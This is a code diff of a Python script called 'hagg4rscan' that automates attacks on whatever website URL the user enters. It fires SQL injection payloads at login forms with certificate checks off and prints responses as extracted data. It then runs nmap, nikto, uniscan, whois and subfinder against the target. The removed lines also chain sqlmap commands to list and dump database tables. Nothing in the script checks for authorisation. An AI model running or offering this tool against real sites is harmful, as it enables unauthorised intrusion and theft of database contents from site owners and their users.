@@ -1,5 +1,5 @@
-import subprocess
 import os
+import subprocess
 import requests
 from requests.exceptions import RequestException, SSLError
 
@@ -21,19 +21,19 @@ def save_to_file(filepath, data):
 def install_tools():
     """Install necessary tools if not already installed."""
     tools = {
-        "uniscan": "sudo apt-get install -y uniscan",
-        "nmap": "sudo apt-get install -y nmap",
-        "sqlmap": "sudo apt-get install -y sqlmap",
-        "nikto": "sudo apt-get install -y nikto",
-        "whois": "sudo apt-get install -y whois",
-        "subfinder": "sudo apt-get install -y subfinder"
+        "uniscan": ["sudo", "apt-get", "install", "-y", "uniscan"],
+        "nmap": ["sudo", "apt-get", "install", "-y", "nmap"],
+        "sqlmap": ["sudo", "apt-get", "install", "-y", "sqlmap"],
+        "nikto": ["sudo", "apt-get", "install", "-y", "nikto"],
+        "whois": ["sudo", "apt-get", "install", "-y", "whois"],
+        "subfinder": ["sudo", "apt-get", "install", "-y", "subfinder"]
     }
     
     for tool, install_command in tools.items():
         print(f"Checking if {tool} is installed...")
         if not is_tool_installed(tool):
             print(f"{tool} not found. Installing {tool}...")
-            stdout, stderr = run_sudo_command(install_command.split())
+            stdout, stderr = run_sudo_command(install_command)
             if stdout:
                 print(stdout)
             if stderr:
@@ -53,22 +53,36 @@ def print_header():
     """Print the header 'hagg4rscan'."""
     header = """
     \033[91m
-              ___           ___           ___           ___           ___           ___     
-     /\  \         /\  \         /\__\         /\__\         /\  \         /\  \    
-     \:\  \       /::\  \       /:/ _/_       /:/ _/_       /::\  \       /::\  \   
-      \:\  \     /:/\:\  \     /:/ /\  \     /:/ /\  \     /:/\:\  \     /:/\:\__\  
-  ___ /::\  \   /:/ /::\  \   /:/ /::\  \   /:/ /::\  \   /:/ /::\  \   /:/ /:/  /  
- /\  /:/\:\__\ /:/_/:/\:\__\ /:/__\/\:\__\ /:/__\/\:\__\ /:/_/:/\:\__\ /:/_/:/__/___
- \:\/:/  \/__/ \:\/:/  \/__/ \:\  \ /:/  / \:\  \ /:/  / \:\/:/  \/__/ \:\/:::::/  /
-  \::/__/       \::/__/       \:\  /:/  /   \:\  /:/  /   \::/__/       \::/~~/~~~~ 
-   \:\  \        \:\  \        \:\/:/  /     \:\/:/  /     \:\  \        \:\~~\     
-    \:\__\        \:\__\        \::/  /       \::/  /       \:\__\        \:\__\    
-     \/__/         \/__/         \/__/         \/__/         \/__/         \/__/    
-                                                                                                                                                    
-                                                                     
+    ,:'/¯/`:,       .·/¯/`:,'                ,.-:~:-.                             __'                              __'                          ,.-:~:-.                .:'/*/'`:,·:~·–:.,           
+  /:/_/::::/';    /:/_/::::';             /':::::::::'`,                    ,.·:'´::::::::`'·-.                ,.·:'´::::::::`'·-.                 /':::::::::'`,             /::/:/:::/:::;::::::/`':.,'     
+ /:'     '`:/::;  /·´    `·,::';          /;:-·~·-:;':::',                 '/::::::::::::::::::';             '/::::::::::::::::::';              /;:-·~·-:;':::',          /·*'`·´¯'`^·-~·:–-'::;:::'`;    
+ ;         ';:';  ;         ';:;        ,'´          '`:;::`,              /;:· '´ ¯¯  `' ·-:::/'            /;:· '´ ¯¯  `' ·-:::/'            ,'´          '`:;::`,        '\                       '`;::'i‘  
+ |         'i::i  i         'i:';°      /                `;::\           /.'´      _         ';/' ‘         /.'´      _         ';/' ‘          /                `;::\         '`;        ,– .,        'i:'/   
+ ';        ;'::/¯/;        ';:;‘'    ,'                   '`,::;       ,:     ,:'´::;'`·.,_.·'´.,    ‘    ,:     ,:'´::;'`·.,_.·'´.,    ‘     ,'                   '`,::;         i       i':/:::';       ;/'    
+ 'i        i':/_/:';        ;:';°   i'       ,';´'`;         '\:::', ‘  /     /':::::/;::::_::::::::;‘    /     /':::::/;::::_::::::::;‘     i'       ,';´'`;         '\:::', ‘     i       i/:·'´       ,:''      
+  ;       i·´   '`·;       ;:/°  ,'        ;' /´:`';         ';:::'i‘,'     ;':::::'/·´¯     ¯'`·;:::¦‘ ,'     ;':::::'/·´¯     ¯'`·;:::¦‘  ,'        ;' /´:`';         ';:::'i‘     '; '    ,:,     ~;'´:::'`:,   
+  ';      ;·,  '  ,·;      ;/'    ;        ;/:;::;:';         ',:::;'i     ';::::::'\             ';:';‘ 'i     ';::::::'\             ';:';‘  ;        ;/:;::;:';         ',:::;     'i      i:/\       `;::::/:'`;'
+   ';    ';/ '`'*'´  ';    ';/' '‘  'i        '´        `'         'i::'/ ;      '`·:;:::::`'*;:'´      |/'   ;      '`·:;:::::`'*;:'´      |/'  'i        '´        `'         'i::'/      ;     ;/   \       '`:/::::/'
+    \   /          '\   '/'      ¦       '/`' *^~-·'´\         ';'/'‚  \          '`*^*'´         /'  ‘   \          '`*^*'´         /'  ‘ ¦       '/`' *^~-·'´\         ';'/'‚      ';   ,'       \         '`;/' 
+     '`'´             `''´   '    '`., .·´              `·.,_,.·´  ‚    `·.,               ,.-·´          `·.,               ,.-·´      '`., .·´              `·.,_,.·´  ‚       `'*´          '`~·-·^'´    
+                      '                                                    '`*^~·~^*'´                     '`*^~·~^*'´                                                                                
     \033[0m
     """
     print(header)
+
+def check_website_status(url):
+    """Check if the website is accessible."""
+    try:
+        response = requests.get(url)
+        if response.status_code == 200:
+            print(f"The website {url} is accessible.")
+            return True
+        else:
+            print(f"The website {url} is not accessible. Status code: {response.status_code}")
+            return False
+    except requests.RequestException as e:
+        print(f"An error occurred: {e}")
+        return False
 
 def perform_sql_injection(target_url):
     """Perform SQL Injection using the provided payloads."""
@@ -91,8 +105,6 @@ def perform_sql_injection(target_url):
         "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
     ]
 
-    vulnerable = False
-
     for payload in payloads:
         data = {
             'username': f'admin{payload}',
@@ -101,124 +113,82 @@ def perform_sql_injection(target_url):
 
         try:
             response = requests.post(target_url, data=data, verify=False)  # Disabling SSL verification
-            if "error" not in response.text.lower():  # Simplified check, should be adapted
-                print(response.text)  # This will display the extracted data, handle it as you wish
-                vulnerable = True
+            if "error" in response.text.lower():
+                print(f"Payload: {payload} might cause an error")
+            else:
+                print(f"Payload: {payload} - Response: {response.text}")  # This will display the extracted data
         except SSLError as e:
             print(f"SSL Error: {e}")
         except RequestException as e:
             print(f"Request Error: {e}")
 
-    return vulnerable
-
-def check_website_status(url):
-    try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            print(f"The website {url} is accessible.")
-            return True
-        else:
-            print(f"The website {url} is not accessible. Status code: {response.status_code}")
-            return False
-    except requests.RequestException as e:
-        print(f"An error occurred: {e}")
-        return False
-
 def main():
-    install_tools()
-    
-    # Clear the screen after installing the tools
-    clear_screen()
-
     # Print the header
     print_header()
 
-    target_url = input("Enter the URL of the website to check: ")
-     target_url = input("Enter the URL of the website to check: ").strip()
+    # Get target URL from the user
+    target_url = input("Enter the URL of the website to check: ").strip()
     
-    # Ensure the URL starts with 'http://' or 'https://'
-    if not target_url.startswith(('http://', 'https://')):
-        target_url = 'http://' + target_url
-
-    # Check if the website is accessible
+    # Check if the target URL is accessible
     if check_website_status(target_url):
-        print("Starting SQL Injection test...")
+        # Perform SQL Injection tests
+        print("Performing SQL Injection tests...")
+        perform_sql_injection(target_url)
         
-        # Perform SQL Injection tests and determine if the site is vulnerable
-        is_vulnerable = perform_sql_injection(target_url)
-        if is_vulnerable:
-            print("The website is vulnerable to SQL Injection.")
-        else:
-            print("The website is not vulnerable to SQL Injection.")
+        # Save results to a file
+        results_file = 'results.txt'
+        print(f"Saving results to {results_file}...")
+        save_to_file(results_file, "SQL Injection test results:")
+        save_to_file(results_file, f"Target URL: {target_url}")
         
-        # Proceed with further tools and scanning
-        install_tools()  # Install necessary tools if not already installed
-        clear_screen()  # Clear the screen after installation
-
-        # Print the header
-        print_header()
-
-        # Set up file paths for saving results
-        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
-        target_dir = os.path.join(desktop_path, target_url)
-        os.makedirs(target_dir, exist_ok=True)
-        output_file = os.path.join(target_dir, "domain.txt")
-
-        # Clear the file if it exists
-        open(output_file, 'w').close()
-
-        tools = {
-            "subfinder": ["sudo", "subfinder", "-d", target_url, "-o", output_file],
-            "sqlmap": ["sqlmap", "--url", target_url],
-            "whois": ["whois", target_url],
-            "nikto": ["nikto", "-h", target_url],
-            "uniscan": ["uniscan", "-u", target_url, "-qd"],
-            "nmap": ["nmap", target_url],
-        }
-
-        total_tools = len(tools)
-
-        for i, (tool_name, command) in enumerate(tools.items(), 1):
-            print(f"Running {tool_name} ({i}/{total_tools})...")
-            stdout, stderr = run_command(command)
-            save_to_file(output_file, f"=== {tool_name} Results ===\n")
-            if stdout:
-                save_to_file(output_file, stdout)
-            if stderr:
-                save_to_file(output_file, f"Errors:\n{stderr}")
-
-            # Calculate and print the progress
-            progress = (i / total_tools) * 100
-            print(f"Progress: {progress:.2f}%")
-
-        # Execute additional SQLMap commands to retrieve database information
-        additional_sqlmap_commands = [
-            f"sqlmap -u {target_url} --dbs",
-            f"sqlmap -u {target_url} --tables -D your_database_name",
-            f"sqlmap -u {target_url} --columns -D your_database_name -T your_table_name",
-            f"sqlmap -u {target_url} --dump -D your_database_name -T your_table_name"
-        ]
-
-        for command in additional_sqlmap_commands:
-            print(f"Executing SQLMap command: {command}")
-            stdout, stderr = run_command(command.split())
-            save_to_file(output_file, f"=== SQLMap Results ===\n")
-            if stdout:
-                save_to_file(output_file, stdout)
-            if stderr:
-                save_to_file(output_file, f"Errors:\n{stderr}")
-
-            # Calculate and print the progress
-            progress = ((i + len(additional_sqlmap_commands)) / (total_tools + len(additional_sqlmap_commands))) * 100
-            print(f"Progress: {progress:.2f}%")
-
-        print("Analysis complete. Results saved to:", output_file)
-    else:
-        print("Cannot proceed with SQL Injection tests as the website is not accessible.")
+        # Run uniscan
+        print("Running uniscan...")
+        stdout, stderr = run_command(["uniscan", "-u", target_url, "-qweds"])
+        save_to_file(results_file, "Uniscan output:")
+        save_to_file(results_file, stdout)
+        if stderr:
+            save_to_file(results_file, "Uniscan errors:")
+            save_to_file(results_file, stderr)
+        
+        # Run nmap scan
+        print("Running nmap scan...")
+        stdout, stderr = run_command(["nmap", "-sS", "-sV", "-T4", target_url])
+        save_to_file(results_file, "Nmap output:")
+        save_to_file(results_file, stdout)
+        if stderr:
+            save_to_file(results_file, "Nmap errors:")
+            save_to_file(results_file, stderr)
+        
+        # Run nikto scan
+        print("Running nikto scan...")
+        stdout, stderr = run_command(["nikto", "-h", target_url])
+        save_to_file(results_file, "Nikto output:")
+        save_to_file(results_file, stdout)
+        if stderr:
+            save_to_file(results_file, "Nikto errors:")
+            save_to_file(results_file, stderr)
+        
+        # Run whois lookup
+        print("Running whois lookup...")
+        stdout, stderr = run_command(["whois", target_url])
+        save_to_file(results_file, "Whois output:")
+        save_to_file(results_file, stdout)
+        if stderr:
+            save_to_file(results_file, "Whois errors:")
+            save_to_file(results_file, stderr)
+        
+        # Run subfinder
+        print("Running subfinder...")
+        stdout, stderr = run_command(["subfinder", "-d", target_url])
+        save_to_file(results_file, "Subfinder output:")
+        save_to_file(results_file, stdout)
+        if stderr:
+            save_to_file(results_file, "Subfinder errors:")
+            save_to_file(results_file, stderr)
+        
+        print(f"All results have been saved to {results_file}")
 
 if __name__ == "__main__":
+    install_tools()
+    clear_screen()
     main()
-
-
-
-
